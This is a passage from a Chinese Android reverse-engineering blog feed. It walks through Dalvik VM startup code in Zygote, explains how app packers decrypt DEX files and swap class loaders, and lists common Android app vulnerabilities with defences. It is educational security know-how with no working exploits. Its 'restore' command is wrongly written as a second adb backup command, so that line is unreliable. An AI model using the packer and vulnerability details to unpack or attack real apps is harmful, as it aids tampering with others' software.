class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmThreadObjStartup())       </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmExceptionStartup())    </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmStringInternStartup())     </span><br><span class="line">    <span class="keyword">goto</span> fail;  </span><br><span class="line"><span class="keyword">if</span> (!dvmNativeStartup())       </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmInternalNativeStartup())    </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmJniStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmReflectStartup())     </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmProfilingStartup())     </span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br></pre></td></tr></table></figure><p>这段代码用来初始化Dalvik虚拟机的各个子模块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* make sure we got these [can this go away?] */</span>   </span><br><span class="line">assert(gDvm.classJavaLangClass != <span class="literal">NULL</span>);    </span><br><span class="line">assert(gDvm.classJavaLangObject != <span class="literal">NULL</span>);    </span><br><span class="line"><span class="comment">//assert(gDvm.classJavaLangString != NULL);  </span></span><br><span class="line">assert(gDvm.classJavaLangThread != <span class="literal">NULL</span>);  </span><br><span class="line">assert(gDvm.classJavaLangVMThread != <span class="literal">NULL</span>);  </span><br><span class="line">assert(gDvm.classJavaLangThreadGroup != <span class="literal">NULL</span>);  </span><br><span class="line"><span class="comment">/*     * Make sure these exist.  If they don&#x27;t, we can return a failure out   </span></span><br><span class="line"><span class="comment">* of main and nip the whole thing in the bud.     */</span>   </span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* earlyClasses[] = &#123;      </span><br><span class="line">    <span class="string">&quot;Ljava/lang/InternalError;&quot;</span>,       </span><br><span class="line">    <span class="string">&quot;Ljava/lang/StackOverflowError;&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;Ljava/lang/UnsatisfiedLinkError;&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;Ljava/lang/NoClassDefFoundError;&quot;</span>, </span><br><span class="line">    <span class="literal">NULL</span>    </span><br><span class="line">&#125;;    </span><br><span class="line"><span class="type">const</span> <span class="type">char</span>** pClassName;   </span><br><span class="line"><span class="keyword">for</span> (pClassName = earlyClasses; *pClassName != <span class="literal">NULL</span>; pClassName++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (dvmFindSystemClassNoInit(*pClassName) == <span class="literal">NULL</span>)   </span><br><span class="line">        <span class="keyword">goto</span> fail;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码检查java.lang.Class、java.lang.Object、java.lang.Thread、java.lang.VMThread和java.lang.ThreadGroup这五个核心类经过前面的初始化操作后已经得到加载，并且确保系统中存在java.lang.InternalError、java.lang.StackOverflowError、java.lang.UnsatisfiedLinkError和java.lang.NoClassDefFoundError这四个核心类。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*     * Miscellaneous class library validation.     */</span> </span><br><span class="line"><span class="keyword">if</span> (!dvmValidateBoxClasses())    </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * Do the last bits of Thread struct initialization we need to allow    </span></span><br><span class="line"><span class="comment">* JNI calls to work.     */</span>  </span><br><span class="line"><span class="keyword">if</span> (!dvmPrepMainForJni(pEnv))      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * Register the system native methods, which are registered through JNI.     */</span> </span><br><span class="line"><span class="keyword">if</span> (!registerSystemNatives(pEnv))      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * Do some &quot;late&quot; initialization for the memory allocator.  This may     * allocate storage and initialize classes.     */</span>   </span><br><span class="line"><span class="keyword">if</span> (!dvmCreateStockExceptions())       </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * At this point, the VM is in a pretty good state.  Finish prep on  </span></span><br><span class="line"><span class="comment">* the main thread (specifically, create a java.lang.Thread object to go  </span></span><br><span class="line"><span class="comment">* along with our Thread struct).  Note we will probably be executing    </span></span><br><span class="line"><span class="comment">* some interpreted class initializer code in here.     */</span> </span><br><span class="line"><span class="keyword">if</span> (!dvmPrepMainThread())       </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="comment">/*     * Make sure we haven&#x27;t accumulated any tracked references.  The main    </span></span><br><span class="line"><span class="comment">* thread should be starting with a clean slate.     */</span>   </span><br><span class="line"><span class="keyword">if</span> (dvmReferenceTableEntries(&amp;dvmThreadSelf()-&gt;internalLocalRefTable) != <span class="number">0</span>)    &#123; </span><br><span class="line">    LOGW(<span class="string">&quot;Warning: tracked references remain post-initialization\n&quot;</span>); </span><br><span class="line">    dvmDumpReferenceTable(&amp;dvmThreadSelf()-&gt;internalLocalRefTable, <span class="string">&quot;MAIN&quot;</span>);</span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">/* general debugging setup */</span>    </span><br><span class="line"><span class="keyword">if</span> (!dvmDebuggerStartup())  </span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br></pre></td></tr></table></figure><p>这段代码继续执行其它函数来执行其它的初始化和检查工作。</p><p>上述初始化和检查操作执行完成之后，我们再来看最后一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     * Init for either zygote mode or non-zygote mode.  The key difference   </span></span><br><span class="line"><span class="comment">  * is that we don&#x27;t start any additional threads in Zygote mode.     */</span>   </span><br><span class="line"><span class="keyword">if</span> (gDvm.zygote) &#123;   </span><br><span class="line">    <span class="keyword">if</span> (!dvmInitZygote())        </span><br><span class="line">        <span class="keyword">goto</span> fail;    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (!dvmInitAfterZygote())    </span><br><span class="line">        <span class="keyword">goto</span> fail;  </span><br><span class="line">&#125;    </span><br><span class="line">......    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fail:   </span><br><span class="line">dvmShutdown();  </span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码完成Dalvik虚拟机的最后一步初始化工作。它检查Dalvik虚拟机是否指定了-Xzygote启动选项。如果指定了的话，那么就说明当前是在Zygote进程中启动Dalvik虚拟机，因此，接下来就会调用函数<code>dvmInitZygote()</code>来执行最后一步初始化工作。否则的话，就会调用另外一个函数<code>dvmInitAfterZygote()</code>来执行最后一步初始化工作。 </p><h4 id="1-2-1-6-dvmInitZygote"><a href="#1-2-1-6-dvmInitZygote" class="headerlink" title="1.2.1.6 dvmInitZygote()"></a>1.2.1.6 dvmInitZygote()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Do zygote-mode-only initialization. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">dvmInitZygote</span><span class="params">(<span class="type">void</span>)</span>&#123;   </span><br><span class="line">    <span class="comment">/* zygote goes into its own process group */</span>   </span><br><span class="line">    setpgid(<span class="number">0</span>,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>dvmInitZygote()</code>的实现很简单，它只是调用了系统调用<code>setpgid()</code>来设置当前进程，即Zygote进程的进程组ID。注意，在调用<code>setpgid()</code>的时候，传递进去的两个参数均为0，这意味着Zygote进程的进程组ID与进程ID是相同的，也就是说，Zygote进程运行在一个单独的进程组里面。</p><p>这一步执行完成之后，Dalvik虚拟机的创建和初始化工作就完成了，回到前面的第1步中，即AndroidRuntime类的成员函数<code>start()</code>中，接下来就会调用AndroidRuntime类的另外一个成员函数<code>startReg()</code>来注册Android核心类的JNI方法。</p><h4 id="1-2-1-7-AndroidRuntime-startReg"><a href="#1-2-1-7-AndroidRuntime-startReg" class="headerlink" title="1.2.1.7 AndroidRuntime.startReg()"></a>1.2.1.7 AndroidRuntime.startReg()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Register android native functions with the VM. */</span></span><br><span class="line"><span class="comment">/*static*/</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">AndroidRuntime::startReg</span><span class="params">(JNIEnv* env)</span>&#123; </span><br><span class="line">    <span class="comment">/*     * This hook causes all future threads created in this process to be    </span></span><br><span class="line"><span class="comment">    * attached to the JavaVM.  (This needs to go away in favor of JNI   </span></span><br><span class="line"><span class="comment">    * Attach calls.)     */</span>    </span><br><span class="line">    androidSetCreateThreadFunc((android_create_thread_fn) javaCreateThreadEtc); </span><br><span class="line">    LOGV(<span class="string">&quot;--- registering native functions ---\n&quot;</span>);  </span><br><span class="line">    <span class="comment">/*     * Every &quot;register&quot; function calls one or more things that return  </span></span><br><span class="line"><span class="comment">    * a local reference (e.g. FindClass).  Because we haven&#x27;t really    </span></span><br><span class="line"><span class="comment">    * started the VM yet, they&#x27;re all getting stored in the base frame  </span></span><br><span class="line"><span class="comment">    * and never released.  Use Push/Pop to manage the storage.     */</span>  </span><br><span class="line">    env-&gt;PushLocalFrame(<span class="number">200</span>);   </span><br><span class="line">    <span class="keyword">if</span> (register_jni_procs(gRegJNI, NELEM(gRegJNI), env) &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        env-&gt;PopLocalFrame(<span class="literal">NULL</span>);     </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    env-&gt;PopLocalFrame(<span class="literal">NULL</span>);    </span><br><span class="line">    <span class="comment">//createJavaThread(&quot;fubar&quot;, quickTest, (void*) &quot;hello&quot;);  </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AndroidRuntime类的成员函数<code>startReg()</code>首先调用函数<code>androidSetCreateThreadFunc()</code>来设置一个线程创建钩子javaCreateThreadEtc。这个线程创建钩子是用来初始化一个Native线程的JNI环境的，也就是说，当我们在C++代码中创建一个Native线程的时候，函数<code>javaCreateThreadEtc()</code>会被调用来初始化该Native线程的JNI环境。后面在分析Dalvik虚拟机线程的创建过程时，我们再详细分析函数<code>javaCreateThreadEtc()</code>的实现。</p><p>AndroidRuntime类的成员函数<code>startReg()</code>接着调用函数<code>register_jni_procs()</code>来注册Android核心类的JNI方法。在注册JNI方法的过程中，需要在Native代码中引用到一些Java对象，这些Java对象引用需要记录在当前线程的一个Native堆栈中。但是此时Dalvik虚拟机还没有真正运行起来，也就是当前线程的Native堆栈还没有准备就绪。在这种情况下，就需要在注册JNI方法之前，手动地将在当前线程的Native堆栈中压入一个帧（Frame），并且在注册JNI方法之后，手动地将该帧弹出来。</p><p>当前线程的JNI环境是由参数env所指向的一个JNIEnv对象来描述的，通过调用它的成员函数<code>PushLocalFrame()</code>和<code>PopLocalFrame()</code>就可以手动地往当前线程的Native堆栈压入和弹出一个帧。注意，这个帧是一个本地帧，只可以用来保存Java对象在Native代码中的本地引用。</p><p>函数<code>register_jni_procs()</code>的实现如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">register_jni_procs</span><span class="params">(<span class="type">const</span> RegJNIRec <span class="built_in">array</span>[], <span class="type">size_t</span> count, JNIEnv* env)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">array</span>[i].mProc(env) &lt; <span class="number">0</span>) &#123;   </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;     </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从前面的调用过程可以知道，参数array指向的是全局变量gRegJNI所描述的一个JNI方法注册函数表，其中，每一个表项都用一个RegJNIRec对象来描述，而每一个RegJNIRec对象都有一个成员变量mProc，指向一个JNI方法注册函数。通过依次调用这些注册函数，就可以将Android核心类的JNI方法注册到前面的所创建的Dalvik虚拟机中去。</p><p>回到AndroidRuntime类的成员函数<code>startReg()</code>中，接下来我们就继续分析函数<code>androidSetCreateThreadFunc()</code>的实现，以便可以了解线程创建钩子javaCreateThreadEtc的注册过程。</p><h4 id="1-2-1-8-androidSetCreateThreadFunc"><a href="#1-2-1-8-androidSetCreateThreadFunc" class="headerlink" title="1.2.1.8 androidSetCreateThreadFunc()"></a>1.2.1.8 androidSetCreateThreadFunc()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> android_create_thread_fn gCreateThreadFn = androidCreateRawThreadEtc;</span><br><span class="line">......</span><br><span class="line"><span class="type">void</span> <span class="title function_">androidSetCreateThreadFunc</span><span class="params">(android_create_thread_fn func)</span>&#123;  </span><br><span class="line">    gCreateThreadFn = func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里就可以看到，线程创建钩子javaCreateThreadEtc被保存在一个函数指针gCreateThreadFn中。注意，函数指针gCreateThreadFn默认是指向函数<code>androidCreateRawThreadEtc()</code>的，也就是说，如果我们不设置线程创建钩子的话，函数<code>androidCreateRawThreadEtc()</code>就是默认使用的线程创建函数。后面在分析Dalvik虚拟机线程的创建过程时，我们再详细分析函数指针gCreateThreadFn是如何使用的。</p><h4 id="1-2-1-9-总结"><a href="#1-2-1-9-总结" class="headerlink" title="1.2.1.9 总结"></a>1.2.1.9 总结</h4><p>至此，我们就分析完成Dalvik虚拟机在Zygote进程中的启动过程，这个启动过程主要就是完成了以下四件事情：</p><ol><li>创建了一个Dalvik虚拟机实例；</li><li>加载了Java核心类及其JNI方法；</li><li>为主线程设置了一个JNI环境；</li><li>注册了Android核心类的JNI方法。</li></ol><p>换句话说，就是Zygote进程为Android系统准备好了一个Dalvik虚拟机实例，以后Zygote进程在创建Android应用程序进程的时候，就可以将它自身的Dalvik虚拟机实例复制到新创建Android应用程序进程中去，从而加快了Android应用程序进程的启动过程。此外，Java核心类和Android核心类（位于DEX文件中），以及它们的JNI方法（位于so文件中），都是以内存映射的方式来读取的，因此，Zygote进程在创建Android应用程序进程的时候，除了可以将自身的Dalvik虚拟机实例复制到新创建的Android应用程序进程之外，还可以与新创建的Android应用程序进程共享Java核心类和Android核心类，以及它们的JNI方法，这样就可以节省内存消耗。</p><p>同时，Zygote进程为了加快Android应用程序进程的启动过程，牺牲了自己的启动速度，因为它需要加载大量的Java核心类，以及注册大量的Android核心类JNI方法。Dalvik虚拟机在加载Java核心类的时候，还需要对它们进行验证以及优化，这些通常都是比较耗时的。又由于Zygote进程是由init进程启动的，也就是说Zygote进程在是开机的时候进行启动的，因此，Zygote进程的牺牲是比较大的。不过毕竟我们在玩手机的时候，很少会关机，也就是很少开机，因此，牺牲Zygote进程的启动速度是值得的，换来的是Android应用程序的快速启动。而且，Android系统为了加快Java类的加载速度，还会想方设法地提前对DEX文件进行验证和优化。</p><h3 id="1-2-2-Android基本类预加载"><a href="#1-2-2-Android基本类预加载" class="headerlink" title="1.2.2 Android基本类预加载"></a>1.2.2 Android基本类预加载</h3><p>Android中的ClassLoader类型分为系统ClassLoader和自定义ClassLoader。其中系统ClassLoader包括3种是BootClassLoader、DexClassLoader、PathClassLoader。</p><p>(1)BootClassLoader：Android平台上所有Android系统启动时会使用BootClassLoader来预加载常用的类。<br>(2)BaseDexClassLoader：实际应用层类文件的加载，而真正的加载委托给pathList来完成。<br>(3)DexClassLoader：可以加载DEX文件以及包含DEX的压缩文件(APK, DEX, JAR, ZIP)，可以安装一个未安装的APK文件，一般为自定义类加载器。<br>(4)PathClassLoader：可以加载系统类和应用程序的类，通常用来加载已安装的APK的DEX文件。</p><img src="/posts/f504c8a5/1.2.3.png" class="" title="Android类加载详细流程"><h1 id="2-壳的动态加载及修复流程"><a href="#2-壳的动态加载及修复流程" class="headerlink" title="2. 壳的动态加载及修复流程"></a>2. 壳的动态加载及修复流程</h1><h2 id="2-1-App启动流程"><a href="#2-1-App启动流程" class="headerlink" title="2.1 App启动流程"></a>2.1 App启动流程</h2><ol><li>BootClassLoader加载系统核心库</li><li>PathClassLoader加载App自身DEX</li><li>进入App自身组件开始执行</li><li>调用声明Application的attachBaseContext</li><li>调用声明Application的onCreate</li></ol><img src="/posts/f504c8a5/2.1.1.png" class="" title="App启动流程"><h2 id="2-2-加壳应用的启动流程"><a href="#2-2-加壳应用的启动流程" class="headerlink" title="2.2 加壳应用的启动流程"></a>2.2 加壳应用的启动流程</h2><img src="/posts/f504c8a5/2.2.1.png" class="" title="加壳应用的启动流程"><p>壳要做的工作有：</p><ol><li>对原先App的DEX进行解密</li><li>初始化自定义类加载器</li><li>替换LoadApk中的加载器为自定义加载器</li></ol><p>在这个启动流程有两个问题需要解决：</p><ol><li>何时进行DEX的解密？在自定义Application的attachBaseContext方法中进行解密。</li><li>如何解决动态加载的DEX中的类的生命周期问题？在自定义Application的onCreate方法中实现。</li></ol><h2 id="2-3-生命周期类处理"><a href="#2-3-生命周期类处理" class="headerlink" title="2.3 生命周期类处理"></a>2.3 生命周期类处理</h2><p>DexClassLoader加载的类是没有组件生命周期的，也就是说即使DexClassLoader通过对APK的动态加载完成了对组件类的加载，当系统启动该组件时，依然会出现加载类失败的异常。为什么组件类被动态加载入虚拟机，但系统却出现加载类失败呢？</p><p>因为Activity不像函数方法，Activity具有生命周期和相关组件信息，只有当ClassLoader被修正后，才能正确加载被解密后的DEX类和方法。</p><p>ClassLoader修正的两种解决方案：</p><ul><li>通过层层反射，拿到mPackage内容，然后根据包名通过LoadApk获取App内的类加载器，最终使用自定义类加载器进行替换。</li></ul><img src="/posts/f504c8a5/2.2.2.png" class="" title="方法一"><ul><li>利用双亲委派机制，在BootClassloader和PathClassloader中插入我们自定义的类加载器，完成修复。</li></ul><img src="/posts/f504c8a5/2.2.3.png" class="" title="方法二"><p>方法一是加壳厂商经常会用的方式，也就是通过自定义DexClassLoader对原先的类加载器进行替换修复。</p><p>这里还分为两种情况：</p><p>一种是原始的App没有自定义Application子类，那么这种情况比较简单，直接替换壳的Application即可。</p><p>另一种情况，是原始App定义了Application子类，那么壳Application的工作就不仅仅是进行解密、类加载器修复等工作了，还有对解密后的DEX原始的Application的方法和类重新进行处理，保证整个过程运行顺畅。</p><p>我们可以看<code>AndroidManifest.xml</code>内的主Application是否被替换为壳Application入口，同时观察壳Application的汇编代码，会发现进行了大量的修复。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;类加载器与动态加载是学习Android加壳与脱壳的需要。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>App常见漏洞</title>
    <link href="http://example.com/posts/c971a26a.html"/>
    <id>http://example.com/posts/c971a26a.html</id>
    <published>2022-08-08T12:21:20.626Z</published>
    <updated>2022-08-10T09:50:37.603Z</updated>
    
    <content type="html"><![CDATA[<p>Android系统中常见的漏洞类型。</p><span id="more"></span><h1 id="1-Android客户端常见漏洞"><a href="#1-Android客户端常见漏洞" class="headerlink" title="1. Android客户端常见漏洞"></a>1. Android客户端常见漏洞</h1><img src="/posts/c971a26a/1.1.1.png" class="" title="Android客户端常见漏洞"><h2 id="1-1-组件安全"><a href="#1-1-组件安全" class="headerlink" title="1.1 组件安全"></a>1.1 组件安全</h2><p>Android四大组件：Activity(界面)、ContentIP rovider(数据)、Service(服务)、Broadcast(广播)。</p><ul><li>对于程序中的每一个界面都是一个Activity，每一个Activity有不同的功能，比如登录、注册、注册码验证、手势密码等，Activity之间的切换需要满足一定的条件。</li><li>ContentIP rovider用于保存和获取数据，并使其对所有应用程序可见。这是不同应用程序间共享数据的唯一方法，因为Android没有提供所有应用共同访问的公共存储区。比如通讯录数据。</li><li>Service是伴随着程序启动，一直运行在后台，主要起检测作用的执行代码。服务一般用于时刻检测客户端的更新状态、时刻检测是否异地登录、时刻上传用户的操作信息。</li><li>Broadcast是当程序检测到外界的某种运行环境发生变化时，而执行的逻辑代码，比如程序的自启动、网络变化、实时消息(打车软件)。</li></ul><h3 id="1-1-1-四大组件的访问权限控制"><a href="#1-1-1-四大组件的访问权限控制" class="headerlink" title="1.1.1 四大组件的访问权限控制"></a>1.1.1 四大组件的访问权限控制</h3><p>最重要的风险点：android:exported属性。</p><p>android:exported是Android中四大组件中都会有的一个属性。如果设为true表示可对外进行访问或使用；设为false表示不可对外进行访问或使用。对内部组件设置为true时，可能出现组件被外部App进行恶意访问、非法操作等风险。</p><h4 id="1-1-1-1-Activity暴露"><a href="#1-1-1-1-Activity暴露" class="headerlink" title="1.1.1.1 Activity暴露"></a>1.1.1.1 Activity暴露</h4><p>Activity暴露的风险：权限绕过、本地拒绝服务攻击。</p><p>本地拒绝服务攻击：</p><img src="/posts/c971a26a/1.2.1.png" class="" title="本地拒绝服务攻击"><h4 id="1-1-1-2-Service暴露"><a href="#1-1-1-2-Service暴露" class="headerlink" title="1.1.1.2 Service暴露"></a>1.1.1.2 Service暴露</h4><h4 id="1-1-1-3-broadcast暴露"><a href="#1-1-1-3-broadcast暴露" class="headerlink" title="1.1.1.3 broadcast暴露"></a>1.1.1.3 broadcast暴露</h4><p>借助广播，监听打车软件的订单信息。</p><h4 id="1-1-1-4-ContentIP-rovider暴露"><a href="#1-1-1-4-ContentIP-rovider暴露" class="headerlink" title="1.1.1.4 ContentIP rovider暴露"></a>1.1.1.4 ContentIP rovider暴露</h4><p>Android本地数据库SQL注入、防范：应避免使用外来字符串拼接SQL语句，或对参与SQL语句拼接的外来字符串进行过滤。</p><h3 id="1-1-2-Intent隐式跳转风险"><a href="#1-1-2-Intent隐式跳转风险" class="headerlink" title="1.1.2 Intent隐式跳转风险"></a>1.1.2 Intent隐式跳转风险</h3><p>隐式调用一般用于在不同应用程序之间的组件跳转，因跳转目标是由系统来进行判断，特殊情况下会出现目标错误，造成传递数据泄露的安全风险。</p><p>通过设置action、category、数据(URI和数据类型)等隐式意图的方式来进行目标跳转，Android系统会根据设置的隐式意图找到最合适的组件作为目标组件进行跳转。</p><p>防范方法：在使用Intent进行组件间跳转时应尽量使用显式调用，非特殊情况应避免使用隐式调用。</p><h3 id="1-1-3-Backup备份安全"><a href="#1-1-3-Backup备份安全" class="headerlink" title="1.1.3 Backup备份安全"></a>1.1.3 Backup备份安全</h3><p>Android API Level 8及其以上Android系统提供了为应用程序数据的备份和恢复功能。此功能的开关决定于该应用程序中<code>AndroidManifest.xml</code>文件中的allowBackup属性值，其属性值默认为true。当为true时，用户可以通过adb backup和adb restore来进行对应用数据的备份和恢复，这可能会带来一定的安全风险。</p><p>备份指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb backup -nosystem -noshared -apk -f xxx.xxx.xxx F:\Restore</span><br></pre></td></tr></table></figure><p>还原指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb backup -f F:\Restore -apk xxx.xxx.xxx</span><br></pre></td></tr></table></figure><h3 id="1-1-4-Java调试开启风险"><a href="#1-1-4-Java调试开启风险" class="headerlink" title="1.1.4 Java调试开启风险"></a>1.1.4 Java调试开启风险</h3><p>Java调试的开启是指在客户端开发时，主配置文件<code>AndroidManifest.xml</code>中设置了debuggable的Debuggable属性为true，导致产生以下风险：</p><ul><li>jdb调试：获取和篡改用户敏感信息，甚至分析并且修改代码实现的业务逻辑，例如窃取用户密码，绕过验证码防护等。</li><li>Release和Debug的调试：Release和Debug模式下，程序运行两种不同的逻辑流程，比如：<ul><li>Debug走程序中的内测流程，使用内网IP、Log调试日志全开</li><li>Release走线上的发布版本流程</li></ul></li></ul><h3 id="1-1-5-使用IMEI作为设备唯一标识风险"><a href="#1-1-5-使用IMEI作为设备唯一标识风险" class="headerlink" title="1.1.5 使用IMEI作为设备唯一标识风险"></a>1.1.5 使用IMEI作为设备唯一标识风险</h3><p>由于Android领域中有不少模拟器可以模拟和篡改IMEI，IMEI在个别特殊系统与终端中是无法获取到的，如果把IMEI作为设备的唯一ID将出现一定的重复与无法获取的几率。</p><p>防范方法：在需要使用设备唯一ID的业务场景中，应使用DEVICE_ID、MAC ADDRESS、Sim Serial Number、IMEI等数据进行字符串组合后生成Hash值作为设备唯一ID，避免单独使用IMEI作为设备唯一ID标识。</p><h3 id="1-1-6-WebView控件漏洞"><a href="#1-1-6-WebView控件漏洞" class="headerlink" title="1.1.6 WebView控件漏洞"></a>1.1.6 WebView控件漏洞</h3><p>WebView是Android客户端浏览Web端页面的系统控件，存在着Web逻辑与本地客户端逻辑的交互，基于这个特点，WebView存在安全风险点有以下几点：</p><ul><li>WebView密码明文保存漏洞</li><li>WebView忽略SSL证书验证错误漏洞</li></ul><h3 id="1-1-7-Activity界面劫持"><a href="#1-1-7-Activity界面劫持" class="headerlink" title="1.1.7 Activity界面劫持"></a>1.1.7 Activity界面劫持</h3><p>Activity界面劫持类似于Web端的“页面钓鱼”，就是通过伪造与原应用非常相像的登录界面、注册界面、找回密码界面等，欺骗用户输入账户名和密码，然后后台将账户密码发送到指定地方的黑客手段。</p><h2 id="1-2-数据安全"><a href="#1-2-数据安全" class="headerlink" title="1.2 数据安全"></a>1.2 数据安全</h2><h3 id="1-2-1-本地数据全局读写漏洞"><a href="#1-2-1-本地数据全局读写漏洞" class="headerlink" title="1.2.1 本地数据全局读写漏洞"></a>1.2.1 本地数据全局读写漏洞</h3><p>App在创建数据库时，将数据库设置了全局的可读权限，攻击者恶意读取数据库内容，获取敏感信息。在设置数据库属性时如果设置全局可写，攻击者可能会篡改、伪造内容，可能会进行诈骗等行为，造成用户财产损失。</p><p>防范方法：应该使用MODE_PRIVATE模式创建数据库。</p><h3 id="1-2-2-调试信息泄露"><a href="#1-2-2-调试信息泄露" class="headerlink" title="1.2.2 调试信息泄露"></a>1.2.2 调试信息泄露</h3><ul><li>运行日志信息泄露</li><li>测试内网/账号泄露</li></ul><h3 id="1-2-3-避免测试数据残留"><a href="#1-2-3-避免测试数据残留" class="headerlink" title="1.2.3 避免测试数据残留"></a>1.2.3 避免测试数据残留</h3><p>发布版本应对程序中所有测试数据、测试方法、内网数据进行统一删除。</p><h2 id="1-3-业务安全"><a href="#1-3-业务安全" class="headerlink" title="1.3 业务安全"></a>1.3 业务安全</h2><h3 id="1-3-1-HTTP-HTTPS中间人攻击"><a href="#1-3-1-HTTP-HTTPS中间人攻击" class="headerlink" title="1.3.1 HTTP/HTTPS中间人攻击"></a>1.3.1 HTTP/HTTPS中间人攻击</h3><h3 